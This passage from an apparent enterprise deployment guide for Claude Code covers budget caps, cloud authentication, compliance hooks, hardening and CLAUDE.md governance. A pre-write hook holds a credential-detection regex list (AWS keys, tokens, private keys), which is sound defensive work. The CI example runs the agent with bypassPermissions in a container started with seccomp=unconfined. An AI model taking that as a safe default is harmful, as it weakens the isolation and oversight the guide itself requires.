- Daily spend per developer (bar chart, sorted descending)
- Cost trend over 30 days (line chart, coloured by model)
- Cache hit rate by project (higher = more efficient CLAUDE.md)
- Tool call frequency heatmap (time-of-day × tool type)
- Budget utilisation gauge (actual vs. allocated per team)

---

## 7. Cost Governance & Budget Caps

### Budget Cap Environment Variables

Claude Code supports two types of budget caps:

```bash
# Hard token cap — session aborts when this many input+output tokens are consumed
export ANTHROPIC_BUDGET_TOKEN_CAP=500000

# Hard dollar cap — session aborts when this USD amount is spent
export ANTHROPIC_BUDGET_USD_CAP=5.00
```

The session is terminated with a `budget_exceeded` error when either cap is hit. These can also be set per-session via CLI:

```bash
claude --max-budget-usd 2.50 --print "Refactor the auth module"
```

Or in settings (per-project or per-user):

```json
{
  "maxBudgetUsd": 5.00,
  "maxBudgetTokenCap": 500000
}
```

In managed settings, these become hard ceilings. Users cannot set budgets above the managed maximum; they can only set lower limits.

### Per-Project, Per-User, Per-Team Allocation

Implement cost allocation by combining OTEL attributes with budget caps:

```bash
# Project-level budget: committed in .claude/settings.json in the repo
# .claude/settings.json
{
  "maxBudgetUsd": 2.00
}

# Team-level budget: set via onboarding script in ~/.claude/settings.json
# Derived from team's monthly allocation divided by working days
DAILY_BUDGET=$(echo "scale=2; ${TEAM_MONTHLY_BUDGET} / 22" | bc)
claude config set maxBudgetUsd "$DAILY_BUDGET"
```

**Budget allocation by team type (example policy):**

| Team Type | Daily Budget | Max Model | Max Effort |
|-----------|-------------|-----------|-----------|
| Junior engineers | $3.00 | Sonnet 4.6 | normal |
| Senior engineers | $8.00 | Opus 4.6 | high |
| Staff / Principal | $20.00 | Opus 4.7 | xhigh |
| Platform / Infra | $15.00 | Opus 4.6 | high |
| CI/CD automation | $1.00 per run | Haiku 4.5 | low |

### Model Tier Policy Enforcement

Force model selection based on role via managed settings with team-specific configurations:

```bash
# deploy-team-policy.sh — called during machine provisioning
LDAP_GROUPS=$(ldapsearch -x -LLL -b "dc=acme,dc=com" \
  "(uid=${USER})" memberOf | grep -o 'cn=[^,]*' | cut -d= -f2)

if echo "$LDAP_GROUPS" | grep -q "staff-engineers"; then
  POLICY_FILE="/opt/acme/claude-policies/staff-engineers.json"
elif echo "$LDAP_GROUPS" | grep -q "senior-engineers"; then
  POLICY_FILE="/opt/acme/claude-policies/senior-engineers.json"
else
  POLICY_FILE="/opt/acme/claude-policies/standard.json"
fi

cp "$POLICY_FILE" /etc/claude-code/managed-settings.json
```

```json
// /opt/acme/claude-policies/standard.json
{
  "model": "claude-sonnet-4-6",
  "maxEffortLevel": "normal",
  "maxBudgetUsd": 3.00,
  "allowedModels": ["claude-sonnet-4-6", "claude-haiku-4-5"],
  "disableTelemetryOverride": true
}

// /opt/acme/claude-policies/staff-engineers.json
{
  "maxEffortLevel": "xhigh",
  "maxBudgetUsd": 20.00,
  "allowedModels": [
    "claude-opus-4-7",
    "claude-opus-4-6",
    "claude-sonnet-4-6",
    "claude-haiku-4-5"
  ],
  "disableTelemetryOverride": true
}
```

### Prompt Caching Strategy for Org-Wide Cost Reduction

Prompt caching is automatic in Claude Code and is the single highest-impact cost optimisation available. Cache read tokens cost 10–20× less than input tokens (Sonnet: $0.30 vs. $3.00/M).

Cache hit rates are determined by how stable the prompt prefix is across requests. The prefix includes:

1. System prompt
2. CLAUDE.md content
3. Rules content loaded at session start
4. Previous conversation turns (if resumed)

**Maximise cache hit rates:**

```markdown
<!-- CLAUDE.md — cache-optimising structure -->
<!-- ✓ DO: Put stable content first, variable content last -->

# Project: Payment Service
# Stack: TypeScript, Node.js 20, PostgreSQL 15

## Architecture
[stable — doesn't change between sessions]

## Conventions
[stable — team-agreed conventions]

## Current Sprint Context  ← put this LAST
[variable — changes weekly]
```

```json
// Settings to maximise cache efficiency
{
  "contextWindowUtilisation": 0.8,   // leave 20% for output
  "cacheWarmup": true,               // warm cache at session start
  "resumeLastSession": true          // reuse conversation history
}
```

**Warm-up pattern for CI/CD:**

```bash
# Warm the cache before expensive CI tasks by loading CLAUDE.md first
# This primes the cache so the actual task hits cache on its first token
claude --print "Acknowledge that you have loaded the project context" \
       --permission-mode plan \
       --max-turns 1 \
       --bare \
  && claude --print "$ACTUAL_TASK" \
            --permission-mode bypassPermissions \
            --max-turns 30
```

Cache entries live for 5 minutes of inactivity. For long-running CI pipelines, keep-alive pings aren't necessary — the cache is maintained as long as the session is active.

**Expected cache hit rates by scenario:**

| Scenario | Expected Cache Hit Rate | Notes |
|---------|------------------------|-------|
| Resumed interactive session | 70–90% | Most of context already cached |
| Fresh session, stable CLAUDE.md | 40–60% | CLAUDE.md tokens cached |
| Headless CI, same repo | 50–70% | CLAUDE.md + codebase context |
| Fresh session, no CLAUDE.md | 5–15% | No stable prefix |

Improving org-wide cache hit rate from 20% to 60% on 500 developers × $5/day = **~$400/day cost reduction**.

---

## 8. Multi-Cloud Authentication

### AWS Bedrock

AWS Bedrock routes Claude API calls through your AWS account, keeping data within your AWS infrastructure and enabling IAM-based access control.

**Prerequisites:**
- AWS account with Bedrock access enabled in your region
- Claude model access requested and approved in the Bedrock console
- IAM role with `bedrock:InvokeModel` permission

**Configuration:**

```bash
export CLAUDE_CODE_USE_BEDROCK=1
export AWS_REGION=us-east-1                    # region where Bedrock is enabled
# Credentials via standard AWS credential chain:
# 1. AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY (not recommended for production)
# 2. IAM instance profile (recommended for EC2/ECS)
# 3. IRSA (recommended for Kubernetes)
# 4. AWS SSO / IAM Identity Center
```

**IAM policy for Claude Code Bedrock access:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ClaudeCodeBedrockAccess",
      "Effect": "Allow",
      "Action": [
        "bedrock:InvokeModel",
        "bedrock:InvokeModelWithResponseStream"
      ],
      "Resource": [
        "arn:aws:bedrock:us-east-1::foundation-model/anthropic.claude-sonnet-4-6*",
        "arn:aws:bedrock:us-east-1::foundation-model/anthropic.claude-haiku-4-5*"
      ]
    }
  ]
}
```

For staff engineers who need Opus access, add Opus model ARNs to the resource list. Use IAM groups to enforce model-tier policy at the cloud layer.

**Bedrock Service Tiers:**

| Tier | Throughput | Latency | Use Case |
|------|-----------|---------|---------|
| `default` | Shared pool | Variable | Development, light use |
| `flex` (Provisioned Throughput) | Reserved capacity | Consistent | Teams > 20 concurrent users |
| `priority` (On-Demand + priority queue) | High | Low | Mission-critical automation |

Configure throughput tier in managed settings:

```json
{
  "bedrockThroughputTier": "flex",
  "bedrockProvisionedArn": "arn:aws:bedrock:us-east-1:123456789:provisioned-model/abc123"
}
```

**Cross-account access (for centralised Bedrock account):**

```json
// Trust policy on the Bedrock account's IAM role
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::DEVELOPER-ACCOUNT-ID:root"
    },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "aws:PrincipalTag/Department": "Engineering"
      }
    }
  }]
}
```

### GCP Vertex AI

Vertex AI routes API calls through your GCP project. The recommended auth pattern is **Workload Identity Federation** — no service account keys, no key rotation, no key leakage risk.

**Configuration:**

```bash
export CLAUDE_CODE_USE_VERTEX=1
export CLOUD_ML_REGION=us-east5         # region where Claude is enabled on Vertex
export ANTHROPIC_VERTEX_PROJECT_ID=acme-ai-prod

# For developer machines: use Application Default Credentials
gcloud auth application-default login

# For CI/CD: use Workload Identity Federation (see below)
```

**Workload Identity Federation setup (for GitHub Actions):**

```bash
# 1. Create WIF pool
gcloud iam workload-identity-pools create "github-actions" \
  --project="${PROJECT_ID}" \
  --location="global" \
  --display-name="GitHub Actions"

# 2. Create provider
gcloud iam workload-identity-pools providers create-oidc "github-provider" \
  --project="${PROJECT_ID}" \
  --location="global" \
  --workload-identity-pool="github-actions" \
  --display-name="GitHub" \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository" \
  --issuer-uri="https://token.actions.githubusercontent.com"

# 3. Bind service account to WIF
gcloud iam service-accounts add-iam-policy-binding \
  "claude-code-ci@${PROJECT_ID}.iam.gserviceaccount.com" \
  --project="${PROJECT_ID}" \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/${PROJECT_NUMBER}/locations/global/workloadIdentityPools/github-actions/attribute.repository/acme-corp/your-repo"
```

**GitHub Actions workflow using WIF:**

```yaml
# .github/workflows/claude-ci.yml
jobs:
  claude-review:
    permissions:
      id-token: write     # Required for WIF
      contents: read

    steps:
    - uses: google-github-actions/auth@v2
      with:
        workload_identity_provider: "projects/123456789/locations/global/workloadIdentityPools/github-actions/providers/github-provider"
        service_account: "claude-code-ci@acme-ai-prod.iam.gserviceaccount.com"

    - name: Run Claude Code
      env:
        CLAUDE_CODE_USE_VERTEX: "1"
        CLOUD_ML_REGION: "us-east5"
        ANTHROPIC_VERTEX_PROJECT_ID: "acme-ai-prod"
      run: |
        claude --print "Review this PR for security issues" \
               --permission-mode plan \
               --output-format json
```

**Vertex AI IAM roles:**

```bash
# Grant the Claude Code service account access to Claude models on Vertex
gcloud projects add-iam-policy-binding "${PROJECT_ID}" \
  --member="serviceAccount:claude-code-ci@${PROJECT_ID}.iam.gserviceaccount.com" \
  --role="roles/aiplatform.user"
```

### Routing Between Bedrock and Vertex

Some organisations use both providers — e.g., AWS teams use Bedrock, GCP teams use Vertex. Configure routing via team-specific managed settings profiles:

```json
// /opt/acme/claude-policies/aws-team.json
{
  "cloudProvider": "bedrock",
  "awsRegion": "us-east-1",
  "bedrockThroughputTier": "flex"
}

// /opt/acme/claude-policies/gcp-team.json
{
  "cloudProvider": "vertex",
  "vertexRegion": "us-east5",
  "vertexProjectId": "acme-ai-prod"
}
```

**Failover pattern** — fall back to direct API if both cloud providers are unavailable:

```bash
# wrapper-claude.sh — used in CI/CD
set -euo pipefail

if aws bedrock list-foundation-models --region us-east-1 &>/dev/null; then
  export CLAUDE_CODE_USE_BEDROCK=1
  export AWS_REGION=us-east-1
elif gcloud ai models list --region=us-east5 &>/dev/null; then
  export CLAUDE_CODE_USE_VERTEX=1
  export CLOUD_ML_REGION=us-east5
  export ANTHROPIC_VERTEX_PROJECT_ID="${GCP_PROJECT}"
else
  # Fallback to direct API (requires ANTHROPIC_API_KEY)
  echo "WARNING: Cloud providers unavailable, using direct API"
fi

exec claude "$@"
```

---

## 9. Enterprise Hooks for Compliance

### Compliance Hook Architecture

Enterprise compliance requirements typically mandate:
- Evidence that no secrets were committed
- Audit trail of all shell commands executed by AI
- Session summaries linked to ticketing systems
- PII not sent to external APIs
- All events forwarded to SIEM

Hooks address all of these. Place hooks in the enterprise plugin's `hooks/` directory — they are automatically installed for every developer when the plugin is installed.

### PreFileWrite: Secret Detection

Block file writes that contain secrets:

```bash
#!/usr/bin/env bash
# hooks/pre-file-write-secrets.sh
# Blocks any file write containing patterns matching secrets

set -euo pipefail

# Read the file path from stdin (JSON from Claude Code)
PAYLOAD=$(cat)
FILE_PATH=$(echo "$PAYLOAD" | jq -r '.tool_input.file_path // .tool_input.path // ""')
CONTENT=$(echo "$PAYLOAD" | jq -r '.tool_input.content // ""')

# Write content to temp file for scanning
TMPFILE=$(mktemp)
echo "$CONTENT" > "$TMPFILE"
trap 'rm -f "$TMPFILE"' EXIT

# Run gitleaks or trufflehog for secret scanning
if command -v gitleaks &>/dev/null; then
  if gitleaks detect --source="$TMPFILE" --no-git --quiet 2>/dev/null; then
    :  # No secrets found
  else
    echo "SECRET DETECTED: Potential secret found in $FILE_PATH — write blocked." >&2
    echo "Run 'gitleaks detect --source=$TMPFILE' locally to see details." >&2
    exit 2  # Exit code 2 blocks the write
  fi
fi

# Additional pattern checks
PATTERNS=(
  'AKIA[0-9A-Z]{16}'                        # AWS Access Key
  'sk-[a-zA-Z0-9]{48}'                       # OpenAI API key
  'xoxb-[0-9]+-[a-zA-Z0-9]+'               # Slack bot token
  'ghp_[a-zA-Z0-9]{36}'                     # GitHub personal token
  'ANTHROPIC_API_KEY\s*=\s*sk-ant-'         # Anthropic API key
  'password\s*=\s*["\x27][^\s]{8,}'         # Hardcoded password
  'BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY'  # Private keys
)

for PATTERN in "${PATTERNS[@]}"; do
  if echo "$CONTENT" | grep -qE "$PATTERN"; then
    echo "BLOCKED: Pattern '$PATTERN' matched in $FILE_PATH" >&2
    echo "This write was blocked to prevent credential exposure." >&2
    exit 2
  fi
done

exit 0
```

Register in `~/.claude/settings.json` or via managed settings:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit|MultiEdit",
        "hooks": [{
          "type": "command",
          "command": "/opt/acme/hooks/pre-file-write-secrets.sh",
          "timeout": 10000
        }]
      }
    ]
  }
}
```

### PostBash: Command Audit Logging

Log every shell command Claude executes to a centralised audit system:

```bash
#!/usr/bin/env bash
# hooks/post-bash-audit.sh
# Logs all Bash tool executions to audit log

set -euo pipefail

PAYLOAD=$(cat)
COMMAND=$(echo "$PAYLOAD" | jq -r '.tool_input.command // ""')
EXIT_CODE=$(echo "$PAYLOAD" | jq -r '.tool_response.exit_code // "unknown"')
SESSION_ID=$(echo "$PAYLOAD" | jq -r '.session_id // "unknown"')
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
HOSTNAME=$(hostname -f)
USER_NAME="${USER:-unknown}"
PROJECT_ROOT=$(echo "$PAYLOAD" | jq -r '.project_root // "unknown"')

# Structured log entry
LOG_ENTRY=$(jq -n \
  --arg ts "$TIMESTAMP" \
  --arg host "$HOSTNAME" \
  --arg user "$USER_NAME" \
  --arg session "$SESSION_ID" \
  --arg cmd "$COMMAND" \
  --arg exit_code "$EXIT_CODE" \
  --arg project "$PROJECT_ROOT" \
  '{
    timestamp: $ts,
    hostname: $host,
    user: $user,
    session_id: $session,
    event_type: "claude_bash_execution",
    command: $cmd,
    exit_code: $exit_code,
    project: $project
  }'
)

# Write to local audit log
echo "$LOG_ENTRY" >> /var/log/claude-code/bash-audit.log

# Forward to SIEM via HTTP (non-blocking — run in background)
if [ -n "${SIEM_ENDPOINT:-}" ]; then
  curl -s -X POST "${SIEM_ENDPOINT}/events" \
       -H "Content-Type: application/json" \
       -H "Authorization: Bearer ${SIEM_TOKEN}" \
       -d "$LOG_ENTRY" \
       --max-time 5 \
       --retry 2 \
       --retry-delay 1 &
fi

exit 0  # Don't block — this is audit only
```

### Stop Hook: Session Summary to Ticketing System

When a Claude Code session ends, automatically create a summary and link it to the current ticket:

```bash
#!/usr/bin/env bash
# hooks/stop-session-summary.sh
# Posts session summary to Jira when session ends with completed work

PAYLOAD=$(cat)
SESSION_ID=$(echo "$PAYLOAD" | jq -r '.session_id // ""')
TRANSCRIPT=$(echo "$PAYLOAD" | jq -r '.transcript_summary // ""')
TOOLS_USED=$(echo "$PAYLOAD" | jq -r '[.tool_calls[].name] | unique | join(", ")' 2>/dev/null || echo "unknown")
COST_USD=$(echo "$PAYLOAD" | jq -r '.total_cost_usd // "0"')
TOKENS=$(echo "$PAYLOAD" | jq -r '.total_tokens // "0"')
PROJECT_ROOT=$(echo "$PAYLOAD" | jq -r '.project_root // ""')

# Extract Jira ticket from git branch name
BRANCH=$(git -C "$PROJECT_ROOT" branch --show-current 2>/dev/null || echo "")
TICKET=$(echo "$BRANCH" | grep -oE '[A-Z]+-[0-9]+' | head -1)

if [ -z "$TICKET" ] || [ -z "${JIRA_TOKEN:-}" ]; then
  exit 0  # No ticket found or no Jira config — skip silently
fi

# Create Jira comment
COMMENT_BODY=$(jq -n \
  --arg summary "$TRANSCRIPT" \
  --arg tools "$TOOLS_USED" \
  --arg cost "$COST_USD" \
  --arg tokens "$TOKENS" \
  --arg session "$SESSION_ID" \
  '{
    body: {
      type: "doc",
      version: 1,
      content: [{
        type: "paragraph",
        content: [{
          type: "text",
          text: ("Claude Code session " + $session + "\n\nSummary: " + $summary + "\n\nTools used: " + $tools + "\nCost: $" + $cost + " (" + $tokens + " tokens)")
        }]
      }]
    }
  }'
)

curl -s -X POST \
  "https://acme.atlassian.net/rest/api/3/issue/${TICKET}/comment" \
  -H "Authorization: Bearer ${JIRA_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "$COMMENT_BODY" &

exit 0
```

### PrePrompt Hook: PII Redaction

Block or sanitise prompts containing PII before they reach the Claude API:

```python
#!/usr/bin/env python3
# hooks/pre-prompt-pii-redact.py
# Redacts PII from user prompts before sending to Claude

import json
import re
import sys

payload = json.load(sys.stdin)
prompt = payload.get("prompt", "")

# PII patterns to redact
PII_PATTERNS = [
    (r'\b\d{3}-\d{2}-\d{4}\b', '[SSN-REDACTED]'),        # US SSN
    (r'\b(?:\d[ -]?){13,16}\b', '[CARD-REDACTED]'),        # Credit card
    (r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', '[PHONE-REDACTED]'), # US phone
    (r'\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b', '[EMAIL-REDACTED]',),  # Email
    (r'\b(?:19|20)\d{2}[-/]\d{2}[-/]\d{2}\b', '[DOB-REDACTED]'),  # Date of birth
]

original = prompt
for pattern, replacement in PII_PATTERNS:
    prompt = re.sub(pattern, replacement, prompt, flags=re.IGNORECASE)

if prompt != original:
    # Log that redaction occurred (but not what was redacted)
    import datetime
    session_id = payload.get("session_id", "unknown")
    with open("/var/log/claude-code/pii-redaction.log", "a") as f:
        f.write(f"{datetime.datetime.utcnow().isoformat()}Z session={session_id} action=pii_redacted\n")

    # Output redacted prompt back to Claude Code
    # Stdout from PrePrompt hooks replaces the prompt
    print(prompt)
else:
    # No redaction needed — output unchanged
    print(prompt)

sys.exit(0)
```

### HTTP Handler: Forward All Events to SIEM

For centralised SIEM integration, use the `http` hook handler type to send all events without a shell intermediary:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "hooks": [{
          "type": "http",
          "url": "https://siem.internal.acme.com/claude-code/pre-tool",
          "method": "POST",
          "headers": {
            "Authorization": "Bearer ${SIEM_TOKEN}",
            "X-Source": "claude-code",
            "X-Hostname": "${HOSTNAME}"
          },
          "timeout": 3000,
          "failOpen": true
        }]
      }
    ],
    "PostToolUse": [
      {
        "hooks": [{
          "type": "http",
          "url": "https://siem.internal.acme.com/claude-code/post-tool",
          "method": "POST",
          "headers": {
            "Authorization": "Bearer ${SIEM_TOKEN}"
          },
          "timeout": 3000,
          "failOpen": true
        }]
      }
    ],
    "SessionEnd": [
      {
        "hooks": [{
          "type": "http",
          "url": "https://siem.internal.acme.com/claude-code/session-end",
          "method": "POST",
          "headers": {
            "Authorization": "Bearer ${SIEM_TOKEN}"
          },
          "timeout": 5000,
          "failOpen": true
        }]
      }
    ]
  }
}
```

`"failOpen": true` means if the SIEM endpoint is unreachable, Claude Code continues working rather than blocking. Set `"failOpen": false` only if your compliance posture requires blocking on SIEM failure (rare; use with caution as it will stop all developer work during SIEM outages).

### Comprehensive Compliance Hook Configuration

Full `hooks` block combining all patterns above:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit|MultiEdit",
        "hooks": [
          {
            "type": "command",
            "command": "/opt/acme/hooks/pre-file-write-secrets.sh",
            "timeout": 10000,
            "description": "Secret detection — blocks writes containing credentials"
          }
        ]
      },
      {
        "hooks": [
          {
            "type": "http",
            "url": "https://siem.internal.acme.com/events",
            "method": "POST",
            "headers": {"Authorization": "Bearer ${SIEM_TOKEN}"},
            "timeout": 2000,
            "failOpen": true,
            "description": "SIEM pre-tool event"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "/opt/acme/hooks/post-bash-audit.sh",
            "timeout": 5000,
            "description": "Audit log for all bash executions"
          }
        ]
      }
    ],
    "SessionEnd": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "/opt/acme/hooks/stop-session-summary.sh",
            "timeout": 15000,
            "description": "Post session summary to Jira ticket"
          }
        ]
      }
    ]
  }
}
```

---

## 10. Security Hardening Checklist

### Deployment Hardening

```
[ ] DISABLE_UPDATES=1 set in managed settings (production environments)
    Rationale: Prevents untested version upgrades in production

[ ] disableTelemetryOverride=true set in managed settings
    Rationale: Telemetry is required for cost attribution and compliance

[ ] Auto-update disabled on developer machines via MDM
    Command: claude config set autoUpdate false

[ ] Version pinned in Dockerfile and CI base images
    Example: RUN npm install -g @anthropic-ai/claude-code@2.1.126

[ ] dangerously-skip-permissions NEVER used in non-sandboxed environments
    Policy: CI/CD requires Docker/ephemeral sandbox before bypassPermissions

[ ] ANTHROPIC_API_KEY stored in vault, not .env files or config files
    Implementation: inject at runtime via Vault agent sidecar or AWS Secrets Manager

[ ] Claude Code not run as root
    Implementation: ensure $USER is not root in all CI/CD runners

[ ] Outbound network from developer workstations reviewed
    Scope: api.anthropic.com or Bedrock/Vertex endpoints only, plus MCP servers
```

### Telemetry Configuration

Claude Code collects the following telemetry by default:

| Data Type | Collected | Contains PII? | Notes |
|-----------|----------|--------------|-------|
| Command invocations | Yes | No | Command names, flags — no content |
| Crash reports | Yes | Potentially (stack traces) | Disable if sensitive |
| Performance metrics | Yes | No | Latency, memory |
| Feature usage | Yes | No | Which features are used |
| Conversation content | **No** | N/A | Content never leaves your machine/cloud |
| File content | **No** | N/A | File names logged, not content |

To disable telemetry entirely:

```bash
export DISABLE_TELEMETRY=1
# Or in managed settings (prevents user re-enabling):
# "disableTelemetryOverride": true  — this forces DISABLE_TELEMETRY=1
```

### Sandbox Mode in CI

In CI/CD pipelines, always run inside a proper sandbox before using `bypassPermissions`:

```yaml
# .github/workflows/claude-ci.yml — correct sandbox setup
jobs:
  claude-task:
    runs-on: ubuntu-latest  # Ephemeral GitHub-hosted runner
    container:
      image: node:20-slim     # Isolated container
      options: --security-opt seccomp=unconfined  # Required for claude sandbox

    steps:
    - uses: actions/checkout@v4

    - name: Install Claude Code
      run: npm install -g @anthropic-ai/claude-code@2.1.126

    - name: Run task
      env:
        ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
      run: |
        # bypassPermissions is safe here because:
        # 1. Ephemeral GitHub Actions runner
        # 2. Inside container
        # 3. Destroyed after job
        claude --print "${{ inputs.task }}" \
               --permission-mode bypassPermissions \
               --max-turns 30 \
               --max-budget-usd 5.00 \
               --bare
```

### Network Policy

Restrict Claude Code network access to approved endpoints only:

```
APPROVED OUTBOUND ENDPOINTS:
  api.anthropic.com:443                      # Direct API
  bedrock-runtime.<region>.amazonaws.com:443 # AWS Bedrock
  <region>-aiplatform.googleapis.com:443     # GCP Vertex AI
  mcp.internal.acme.com:443                  # Internal MCP server
  otel.internal.acme.com:4318               # OTEL collector

BLOCK ALL OTHER OUTBOUND from Claude Code processes
  (implement via iptables, AWS Security Group, or GCP VPC firewall)
```

### RBAC for MCP Tool Access

Implement role-based access control at the MCP server layer:

```python
# mcp_server/rbac.py
TOOL_ROLES = {
    "internal_db_query":           ["all-engineers"],
    "internal_db_write":           ["staff-engineers", "data-engineers"],
    "vault_get_secret":            ["all-engineers"],
    "vault_write_secret":          ["staff-engineers", "platform-team"],
    "deploy_service":              ["senior-engineers", "staff-engineers"],
    "deploy_service_production":   ["staff-engineers"],
    "pagerduty_create_incident":   ["all-engineers"],
    "billing_data_query":          ["data-engineers", "staff-engineers"],
}

async def check_tool_permission(tool_name: str, user_groups: list[str]) -> bool:
    """Returns True if the user's groups include any role allowed to call this tool."""
    allowed_roles = TOOL_ROLES.get(tool_name)
    if allowed_roles is None:
        return False  # Unknown tools are denied by default

    return any(
        role in allowed_roles
        for role in user_groups + ["all-engineers"]  # all-engineers is universal
    )
```

---

## 11. Team CLAUDE.md Governance

### Hierarchy for Multi-Team Organisations

Claude Code loads CLAUDE.md files in a defined hierarchy. For enterprise, this maps cleanly to organisational levels:

```
LOAD ORDER (first loaded = lowest priority; last loaded = highest override)
──────────────────────────────────────────────────────────────────────────

1. Enterprise CLAUDE.md        ← From @acme/claude-standards plugin
   /opt/acme/plugin/CLAUDE.md
   Contains: security policy, PII handling, internal tool usage, org identity
   Audience: all engineers at Acme
   Managed by: Platform team
   Update cycle: quarterly or on policy change

2. Division CLAUDE.md          ← From @acme/claude-payments plugin
   ~/.claude/plugins/@acme/claude-payments/CLAUDE.md
   Contains: payments domain conventions, PCI-DSS guidelines, API contracts
   Audience: all engineers in the Payments division
   Managed by: Payments platform lead
   Update cycle: monthly

3. Team CLAUDE.md              ← Distributed via team plugin or git submodule
   ~/.claude/CLAUDE.md (user-level)
   Contains: team norms, local tooling, sprint context
   Audience: team members only
   Managed by: tech lead
   Update cycle: per sprint

4. Project CLAUDE.md           ← Checked into the repo
   ./CLAUDE.md
   Contains: project-specific conventions, architecture, testing patterns
   Audience: anyone working on this project
   Managed by: project maintainers
   Update cycle: as needed

5. CLAUDE.local.md             ← Git-ignored personal overrides
   ./CLAUDE.local.md
   Contains: personal shortcuts, local env paths, personal conventions
   Audience: individual developer only
   Never committed, never shared
```

### @import Chains for Shared Sections

Use `@import` to compose CLAUDE.md from shared sections without duplication:

```markdown
<!-- Enterprise CLAUDE.md (in plugin) -->
# Acme Corp Standards

@import ./shared/security-baseline.md      ← same file reused by all divisions
@import ./shared/internal-tools.md
@import ./shared/logging-standards.md

<!-- Division CLAUDE.md -->
# Payments Division Standards

@import https://raw.githubusercontent.com/acme-corp/standards/v2.4/security-baseline.md

## Payments-Specific

All payment processing must comply with PCI-DSS v4.0.
Card data must never appear in logs, traces, or AI context.
```

The `@import` path can be:
- Relative to the CLAUDE.md file: `@import ./section.md`
- Absolute path: `@import /etc/acme/claude/baseline.md`
- URL (fetched once at session start): `@import https://internal.acme.com/claude/v2/security.md`

### Versioning via Git Submodules

For teams that prefer git over npm plugins:

```bash
# Add shared standards as a git submodule
git submodule add https://git.internal.acme.com/platform/claude-standards.git \
  .claude/shared

# Reference from CLAUDE.md
# @import .claude/shared/security-baseline.md

# Update to latest
git submodule update --remote .claude/shared

# Pin to a specific version
cd .claude/shared && git checkout v2.4.1 && cd ../..
git add .claude/shared && git commit -m "chore: pin claude-standards to v2.4.1"
```

### Template Registry for New Projects

Provide a template registry so new projects start with the right CLAUDE.md:

```bash
#!/usr/bin/env bash
# claude-init — run when creating a new project
# Usage: claude-init [template-name]

TEMPLATE_REGISTRY="https://git.internal.acme.com/platform/claude-templates"
TEMPLATE="${1:-default}"

case "$TEMPLATE" in
  api)       TEMPLATE_PATH="api-service" ;;
  frontend)  TEMPLATE_PATH="frontend-app" ;;
  data)      TEMPLATE_PATH="data-pipeline" ;;
  infra)     TEMPLATE_PATH="infrastructure" ;;
  *)         TEMPLATE_PATH="default" ;;
esac

# Fetch template
curl -sL "${TEMPLATE_REGISTRY}/raw/main/${TEMPLATE_PATH}/CLAUDE.md" \
  > ./CLAUDE.md

# Substitute project-specific variables
PROJECT_NAME=$(basename "$(pwd)")
sed -i "s/{{PROJECT_NAME}}/${PROJECT_NAME}/g" ./CLAUDE.md
sed -i "s/{{DATE}}/$(date +%Y-%m-%d)/g" ./CLAUDE.md
sed -i "s/{{TEAM}}/$(git config user.team 2>/dev/null || echo 'unknown')/g" ./CLAUDE.md

mkdir -p .claude/rules .claude/skills

echo "Initialised CLAUDE.md from template: ${TEMPLATE_PATH}"
echo "Edit ./CLAUDE.md to add project-specific details."
```

### Token Budget Governance

CLAUDE.md content is loaded into every session. Bloated CLAUDE.md files waste tokens and reduce cache efficiency. Enforce size targets:

| Scope Level | Target Token Size | Hard Max | Notes |
|-------------|-----------------|----------|-------|
| Enterprise (plugin) | 800–1,500 tokens | 3,000 | Security policy, internal tools |
| Division plugin | 400–800 tokens | 1,500 | Domain conventions |
| Team (`~/.claude/CLAUDE.md`) | 300–600 tokens | 1,000 | Team norms only |
| Project (`./CLAUDE.md`) | 500–1,500 tokens | 3,000 | Project-specific details |
| `CLAUDE.local.md` | 100–300 tokens | 500 | Personal overrides only |
| **Total loaded** | **2,000–4,500 tokens** | **8,000** | Above this, costs grow |

Check token count:

```bash
# Estimate tokens in CLAUDE.md (rough: 4 chars ≈ 1 token)
wc -c CLAUDE.md | awk '{printf "Estimated tokens: %d\n", $1/4}'

# Or count via Claude Code itself
claude --print "Count the tokens in the loaded CLAUDE.md context" \
       --permission-mode plan \
       --max-turns 1
```

---

## 12. Organisational Rollout Playbook

### Phase 1: Platform Team Pilot (Weeks 1–2)

**Objective:** Prove the deployment pipeline and baseline configuration. Identify gaps before broader rollout.

**Who:** 5–10 platform team engineers who understand the configuration deeply.

**Setup checklist:**

```
Week 1:
[ ] Deploy managed-settings.json to pilot machines via MDM
[ ] Install enterprise plugin (@acme/claude-standards) on pilot machines
[ ] Configure OTEL exporter to central collector
[ ] Set up Grafana dashboard for cost + usage monitoring
[ ] Configure Bedrock or Vertex AI (whichever is primary)
[ ] Test all compliance hooks on pilot machines
[ ] Validate policy with test-policy.sh script
[ ] Document any issues in tracking system

Week 2:
[ ] Refine managed-settings.json based on pilot feedback
[ ] Fix any hook failures or false positives
[ ] Establish cost baseline ($ per developer per day)
[ ] Create onboarding runbook
[ ] Record pilot success metrics
```

**Success criteria for Phase 1:**
- All 5–10 pilot engineers actively using Claude Code daily
- Zero compliance hook false positives causing workflow disruption
- OTEL traces appearing in dashboard for all sessions
- Cost per developer per day within 20% of projected
- No secrets committed to any repository during pilot

### Phase 2: Early Adopter Cohort (Weeks 3–6)

**Objective:** Validate configuration at scale with diverse team types. Collect structured feedback.

**Who:** 40–60 engineers, deliberately diverse: 2–3 frontend engineers, 2–3 backend engineers, 2–3 platform engineers, 1–2 data engineers, 1–2 mobile engineers.

**Rollout steps:**

```bash
# Week 3: Staged rollout to early adopters
for MACHINE in $(ldap_get_machines "group=early-adopters"); do
